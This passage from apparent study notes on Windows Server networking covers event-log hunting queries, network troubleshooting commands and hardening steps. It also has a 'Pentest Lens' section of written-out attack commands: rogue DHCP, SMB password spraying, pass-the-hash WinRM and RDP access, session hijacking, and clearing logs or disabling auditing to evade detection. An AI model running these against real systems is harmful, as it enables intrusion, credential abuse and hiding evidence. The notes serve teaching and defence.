$events = Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625; StartTime=(Get-Date).AddHours(-1)}
$events | Group-Object {$_.Properties[19].Value} | Where-Object Count -gt 10 |
  Select-Object Count, Name | Sort-Object Count -Descending

# Find all admin group additions in last 24 hours
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4728,4732,4756; StartTime=(Get-Date).AddDays(-1)} |
  ForEach-Object {
    [PSCustomObject]@{
      Time = $_.TimeCreated
      User = $_.Properties[0].Value
      Group = $_.Properties[2].Value
      AddedBy = $_.Properties[6].Value
    }
  }

# Find new services installed today (7045 in System log)
Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045; StartTime=(Get-Date).Date} |
  Select-Object TimeCreated, @{n="ServiceName";e={$_.Properties[0].Value}},
    @{n="ImagePath";e={$_.Properties[1].Value}},
    @{n="ServiceType";e={$_.Properties[2].Value}},
    @{n="Account";e={$_.Properties[4].Value}}

# Find Kerberoasting (many 4769 TGS requests with RC4 encryption)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4769; StartTime=(Get-Date).AddHours(-1)} |
  Where-Object {
    $_.Properties[5].Value -eq "0x17"    # RC4 encryption type
  } | Group-Object {$_.Properties[0].Value} |    # Group by requesting account
  Where-Object Count -gt 5 |
  Select-Object Count, Name

# Find PowerShell execution (4688 — requires process creation auditing enabled)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} |
  Where-Object {$_.Properties[5].Value -like "*powershell*"} |
  Select-Object TimeCreated, @{n="Process";e={$_.Properties[5].Value}},
    @{n="CommandLine";e={$_.Properties[8].Value}},
    @{n="User";e={$_.Properties[1].Value}}

# Find log clearing (1102 = Security log cleared)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102} |
  Select-Object TimeCreated, @{n="ClearedBy";e={$_.Properties[1].Value}}
```

---

## 10. Windows Network Troubleshooting — Complete Reference

### ipconfig

```cmd
ipconfig                      :: Basic IP config per adapter
ipconfig /all                 :: Full config including MAC, DHCP server, DNS servers, lease times
ipconfig /release             :: Release DHCP lease on all adapters
ipconfig /renew               :: Request new DHCP lease
ipconfig /release "Ethernet"  :: Release specific adapter
ipconfig /renew "Ethernet"    :: Renew specific adapter
ipconfig /flushdns            :: Clear DNS resolver cache
ipconfig /displaydns          :: Show DNS cache contents
ipconfig /registerdns         :: Re-register DNS name with DNS server
```

### netstat

```cmd
netstat -a         :: All active connections and listening ports
netstat -n         :: Numeric output (no hostname resolution)
netstat -b         :: Show executable for each connection (requires admin)
netstat -o         :: Show PID for each connection
netstat -an        :: All connections, numeric
netstat -ano       :: All connections, numeric, with PID
netstat -r         :: Routing table (same as route print)
netstat -s         :: Protocol statistics (packets sent/received/errors per protocol)
netstat -e         :: Ethernet statistics (bytes/packets in/out, errors)
netstat -p tcp     :: Only TCP connections
netstat -p udp     :: Only UDP endpoints
netstat -an | findstr LISTENING    :: Only listening ports
netstat -an | findstr :3389        :: Find who is connected to RDP

:: PowerShell equivalent (more powerful)
Get-NetTCPConnection                              :: All TCP connections
Get-NetTCPConnection -State Listen                :: Listening ports only
Get-NetTCPConnection -LocalPort 443               :: Who is on port 443
Get-NetTCPConnection | Where-Object {$_.State -eq "Established"} |
  Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort,
    @{n="Process";e={(Get-Process -Id $_.OwningProcess).Name}}
```

### nslookup

```cmd
nslookup example.com                        :: A record lookup
nslookup -type=MX example.com              :: MX records
nslookup -type=NS example.com              :: NS records
nslookup -type=TXT example.com             :: TXT records (SPF, DKIM)
nslookup -type=SRV _ldap._tcp.corp.local   :: SRV records
nslookup 192.168.1.10                       :: Reverse DNS lookup
nslookup example.com 8.8.8.8               :: Use specific DNS server
nslookup                                    :: Interactive mode
> server 192.168.1.10                       :: Switch DNS server interactively
> set type=ANY                              :: Query all record types
> corp.local                                :: Query current domain
> exit
```

### tracert and pathping

```cmd
tracert 8.8.8.8                    :: Trace route (ICMP-based)
tracert -d 8.8.8.8                 :: No DNS resolution (faster)
tracert -h 30 8.8.8.8             :: Max 30 hops (default 30)

pathping 8.8.8.8                   :: Combined tracert + ping with loss stats
pathping -n 8.8.8.8                :: No DNS resolution
pathping -p 500 8.8.8.8           :: 500ms interval between probes
```

### arp

```cmd
arp -a                             :: Show ARP cache (all interfaces)
arp -a -N 192.168.1.50            :: ARP cache for specific interface
arp -d 192.168.1.10               :: Delete ARP entry for specific IP
arp -d *                           :: Clear all ARP cache entries
arp -s 192.168.1.1 AA-BB-CC-DD-EE-FF  :: Add static ARP entry

:: PowerShell
Get-NetNeighbor                    :: ARP and NDP cache
Get-NetNeighbor -State Reachable   :: Only confirmed reachable entries
Remove-NetNeighbor -IPAddress 192.168.1.10    :: Clear specific ARP entry
```

### netsh

```cmd
:: Interface management
netsh interface show interface                   :: All interfaces and status
netsh interface ip show addresses               :: IP addresses
netsh interface ip show config                  :: Full IP config

:: Set static IP (example)
netsh interface ip set address "Ethernet" static 192.168.1.50 255.255.255.0 192.168.1.1

:: Set DNS servers
netsh interface ip set dns "Ethernet" static 192.168.1.10
netsh interface ip add dns "Ethernet" 192.168.1.11 index=2

:: Return to DHCP
netsh interface ip set address "Ethernet" dhcp
netsh interface ip set dns "Ethernet" dhcp

:: Firewall
netsh advfirewall show allprofiles               :: Firewall status
netsh advfirewall firewall show rule name=all    :: All rules

:: WLAN (wireless)
netsh wlan show interfaces                       :: Wireless adapter status
netsh wlan show profiles                         :: Saved Wi-Fi profiles
netsh wlan show profile name="CorpWiFi" key=clear  :: Show profile including cleartext key
netsh wlan connect name="CorpWiFi"              :: Connect to saved profile
netsh wlan disconnect                            :: Disconnect
netsh wlan export profile folder=C:\Profiles\   :: Export all profiles
```

### Test-NetConnection (PowerShell — Best Tool for Connectivity Testing)

```powershell
# Basic connectivity (ICMP ping)
Test-NetConnection 192.168.1.10

# Test specific TCP port
Test-NetConnection 192.168.1.10 -Port 443
Test-NetConnection dc01.corp.local -Port 389    # Test LDAP to DC
Test-NetConnection dc01.corp.local -Port 88     # Test Kerberos to DC

# Detailed output (shows route, RTT, TCP status)
Test-NetConnection 8.8.8.8 -InformationLevel Detailed

# Test multiple ports
80, 443, 8080, 8443 | ForEach-Object {
  $result = Test-NetConnection -ComputerName 192.168.1.10 -Port $_
  [PSCustomObject]@{Port=$_; Status=if($result.TcpTestSucceeded){"Open"}else{"Closed"}}
}

# Traceroute
Test-NetConnection 8.8.8.8 -TraceRoute

# Output:
# ComputerName     : 8.8.8.8
# RemoteAddress    : 8.8.8.8
# RemotePort       : 0
# InterfaceAlias   : Ethernet
# SourceAddress    : 192.168.1.50
# PingSucceeded    : True
# PingReplyDetails : RTT: 12 ms, Status: Success
```

### Resolve-DnsName

```powershell
# Versatile DNS lookup tool
Resolve-DnsName google.com                         # A record
Resolve-DnsName google.com -Type MX               # MX records
Resolve-DnsName google.com -Type NS               # NS records
Resolve-DnsName google.com -Type TXT              # TXT records
Resolve-DnsName 8.8.8.8                           # Reverse lookup
Resolve-DnsName corp.local -Type SRV              # SRV records
Resolve-DnsName _ldap._tcp.dc._msdcs.corp.local -Type SRV  # DC locator
Resolve-DnsName google.com -Server 8.8.8.8        # Use specific DNS server
Resolve-DnsName google.com -DnsOnly               # Skip NetBIOS/hosts file
```

---

## 11. Pentest Lens — Windows Server Networking

### Pentest Lens

**Attacker's view**: Windows Server is the backbone of virtually every enterprise network. Active Directory, DNS, DHCP, SMB, WinRM, and RDP are all attack surfaces. Misconfiguration of any one of these creates a path to domain compromise.

**AD DNS — Enumeration and Attack**:
```bash
# Enumerate AD DNS from outside (if DNS not restricted)
# Zone transfer attempt — often allowed on internal DNS
dig axfr corp.local @192.168.1.10

# Enumerate DC SRV records (reveals DC hostnames and IPs)
nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='corp.local'" 192.168.1.10
dig SRV _ldap._tcp.dc._msdcs.corp.local @192.168.1.10

# DNS brute force for internal subdomains
dnsx -d corp.local -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Once inside — Windows DNS recon
Resolve-DnsName -Type SRV _ldap._tcp.dc._msdcs.corp.local    # Find all DCs
```

**DHCP — Rogue Server / Starvation**:
```bash
# DHCP starvation (fill scope, force clients to get IP from rogue server)
yersinia dhcp -attack 1 -interface eth0

# Rogue DHCP (set attacker as gateway/DNS)
dnsmasq --interface=eth0 \
  --dhcp-range=192.168.1.200,192.168.1.250,12h \
  --dhcp-option=3,192.168.1.99 \    # Rogue gateway
  --dhcp-option=6,192.168.1.99      # Rogue DNS
```

**SMB Enumeration (Post-Credential)**:
```bash
# Enumerate shares
crackmapexec smb 192.168.1.0/24 -u jsmith -p Password123 --shares

# List files in shares
crackmapexec smb 192.168.1.10 -u jsmith -p Password123 -M spider_plus

# Enumerate users via SMB
crackmapexec smb 192.168.1.10 -u jsmith -p Password123 --users
crackmapexec smb 192.168.1.10 -u jsmith -p Password123 --groups

# Check SMB signing (is relay possible?)
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets_no_signing.txt
# Generates list of hosts without SMB signing — valid ntlmrelayx targets

# Password spray via SMB
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Winter2026!' --continue-on-success
```

**WinRM Exploitation**:
```bash
# Check if WinRM is accessible
crackmapexec winrm 192.168.1.0/24 -u jsmith -p Password123

# Get remote shell via WinRM (Evil-WinRM)
evil-winrm -i 192.168.1.10 -u jsmith -p Password123
evil-winrm -i 192.168.1.10 -u Administrator -H <NTLM-hash>    # Pass-the-Hash

# With certificate (if cert auth enabled)
evil-winrm -i 192.168.1.10 -c cert.pem -k key.pem -S    # -S = SSL

# Features in Evil-WinRM:
# upload/download files, load PowerShell scripts, run Mimikatz, bypass AMSI
```

**RDP Attack Techniques**:
```bash
# Check for NLA enforcement (if no NLA, login screen visible pre-auth)
nmap --script rdp-enum-encryption -p 3389 192.168.1.10
# SecurityLayer: 0=RDP Security, 1=Negotiate, 2=SSL, 3=CredSSP(NLA)

# Brute force (careful — account lockout)
hydra -L users.txt -P passwords.txt rdp://192.168.1.10 -t 1

# Pass-the-Hash RDP (requires Restricted Admin mode enabled on target)
xfreerdp /v:192.168.1.10 /u:Administrator /pth:<NTLM-hash> /cert-ignore

# BlueKeep check (CVE-2019-0708 — pre-auth RCE, patched but worth checking)
nmap --script rdp-vuln-ms12-020 -p 3389 192.168.1.10    # Related DoS
python3 bluekeep_check.py 192.168.1.10    # Specific BlueKeep PoC scanner

# RDP session hijacking (requires SYSTEM on target)
# List sessions
query session /server:192.168.1.10
# Hijack disconnected session (no credentials needed)
tscon 2 /dest:rdp-tcp#1    # Connect session 2 to your session
```

**Event ID Evasion**:
```powershell
# Clear security event log (generates 1102 — itself detected)
wevtutil cl Security

# More targeted — delete specific event IDs without clearing all
# (requires direct log file manipulation — complex, forensically detectable)

# Disable audit policies (generates 4719 — itself detected)
auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable

# Use native tools to avoid 4688 (process creation) logging
# LOLBins: certutil, mshta, regsvr32, rundll32, wmic, bitsadmin
# These may not be in custom 4688 alert exclusions

# PowerShell logging bypass (AMSI + ScriptBlock logging)
# Various techniques — see offensive PowerShell resources
# Key: these generate 4104 (script block logging) events if Transcription/Block Logging enabled
```

**Misconfigurations to hunt for**:
```
AD DNS zone transfers open to any host → full internal DNS enumeration
SMBv1 enabled → EternalBlue (MS17-010) exploitation
SMB signing not required → NTLM relay attack
WinRM over HTTP (5985) accessible on workstations → remote code execution
RDP with no NLA → pre-auth credential prompt, credential spraying
RDP exposed to internet → automated brute force / exploitation
DHCP without snooping → rogue DHCP server
NPS without certificate validation on clients → rogue RADIUS PEAP capture
Admin shares accessible to domain users → excessive privilege
PowerShell Remoting enabled on all machines → lateral movement via WinRM
Unrestricted PowerShell execution policy → malicious script execution
```

**Defender's counter**:
```powershell
# Restrict DNS zone transfers
Set-DnsServerPrimaryZone -Name corp.local -SecureSecondaries TransferToSecureServers

# Disable SMBv1
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force

# Require SMB signing
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force

# Disable LLMNR
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" "EnableMulticast" 0

# Disable NBT-NS (via DHCP option or per-adapter)
# DHCP Option 001 (NetBIOS Node Type) → 0x2

# Restrict WinRM to management hosts
New-NetFirewallRule -DisplayName "WinRM HTTPS Management Only" `
  -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5986 `
  -RemoteAddress 10.0.100.0/24
New-NetFirewallRule -DisplayName "Block WinRM HTTP" `
  -Direction Inbound -Action Block -Protocol TCP -LocalPort 5985

# Enable PowerShell Constrained Language Mode via AppLocker/WDAC
# AppLocker → Script Rules → allow only signed scripts

# Enable enhanced PowerShell logging (GPO)
# Computer Config → Administrative Templates → Windows Components → PowerShell
# "Turn on Module Logging" → Enabled
# "Turn on PowerShell Script Block Logging" → Enabled
# "Turn on Transcription" → Enabled → Output directory: central share
```

---

## Quick Reference — Module 7

### AD Key Ports
| Service | Port | Protocol |
|---------|------|---------|
| DNS | 53 | TCP/UDP |
| Kerberos | 88 | TCP/UDP |
| RPC Mapper | 135 | TCP |
| LDAP | 389 | TCP |
| SMB | 445 | TCP |
| LDAPS | 636 | TCP |
| Global Catalog | 3268/3269 | TCP |
| RDP | 3389 | TCP |
| WinRM HTTP | 5985 | TCP |
| WinRM HTTPS | 5986 | TCP |
| AD Web Services | 9389 | TCP |

### Critical Event IDs
| ID | Log | Event |
|----|-----|-------|
| 4624 | Security | Successful logon |
| 4625 | Security | Failed logon |
| 4648 | Security | Explicit credential logon |
| 4672 | Security | Admin privileges assigned |
| 4688 | Security | Process created |
| 4719 | Security | Audit policy changed — alert |
| 4728/4732 | Security | User added to group |
| 4769 | Security | Kerberos TGS request |
| 4771 | Security | Kerberos pre-auth failed |
| 1102 | Security | Security log cleared — alert |
| 7045 | System | New service installed |

### Windows Troubleshooting Commands
```powershell
ipconfig /all                          # Full IP config
Test-NetConnection <host> -Port <port> # TCP port test
Resolve-DnsName <name> -Type SRV       # DNS lookup
Get-NetTCPConnection -State Listen     # Listening ports
Get-NetNeighbor                        # ARP cache
Get-NetRoute                           # Routing table
netstat -ano                           # Connections with PID
nltest /dsgetdc:corp.local             # Find DC
gpresult /r                            # Applied GPOs
```

### SMB Hardening Checklist
```powershell
Set-SmbServerConfiguration -EnableSMB1Protocol $false    # Disable SMBv1
Set-SmbServerConfiguration -RequireSecuritySignature $true  # Enable signing
Set-SmbServerConfiguration -EncryptData $true             # Enable encryption
Set-SmbClientConfiguration -RequireSecuritySignature $true  # Client signing
```

---

## Related Notes
- [[Module-03-Protocols-Deep-Dive]] — Kerberos ticket flow, LLMNR/NBT-NS, SMB, RDP, WinRM detail
- [[Module-04-Network-Security]] — 802.1X, RADIUS, Zero Trust applied to Windows domain
- [[Module-05-Firewall-Configuration]] — Firewall rules for AD ports
- [[Module-06-Network-Monitoring]] — Windows Event IDs in SIEM, Splunk queries
- [[Module-09-VPNs-Remote-Access]] — SSTP/IKEv2 VPN via RRAS, NPS for VPN auth
- [[Module-12-Pentest-Perspective]] — AD attack chains, BloodHound, Mimikatz, CrackMapExec
